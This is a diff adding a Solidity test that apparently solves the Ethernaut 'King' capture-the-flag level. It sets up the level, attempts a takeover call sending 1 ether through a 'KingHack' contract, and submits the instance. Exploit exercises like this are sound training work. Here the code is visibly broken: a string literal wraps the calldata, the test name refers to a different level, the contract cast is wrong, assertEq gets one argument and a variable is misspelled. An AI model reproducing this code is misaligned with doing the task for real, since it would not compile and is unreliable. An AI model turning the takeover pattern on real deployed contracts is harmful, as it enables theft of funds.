@@ -23,5 +23,28 @@ contract KingTest is DSTest {
     //level set up, attack and submission
     function testVaultHack() public {
         //LEVEL SET UP
+        KingFactory kingFactory = new KingFactory();
+        ethernaut.registerLevel(kingFactory);
+        vm.startPrank(attacker);
+
+        address levelAddress = ethernaut.createLevelInstance(kingFactory);
+        King kingContract = King(payable(address(levelAddress)));
+
+        //LEVEL ATTACK
+        KingHack kingHack = KingHack(payable(address(levelAddress)));
+        kingHack.call{value: 1 ether}('
+           abi.encodeWithSelector(bytes4(keccak256(bytes(attack()))))
+           ');
+        
+        address newKing = kingContract._king();
+        assertEq(newKing == address(this));
+
+        //LEVEL SUBMISSION
+        bool challengeCompleted = ethernaut.submitLevelInstance(
+            payable(levelAddress)
+        );
+
+        assert(challenCompleted);
+        
     }
 }
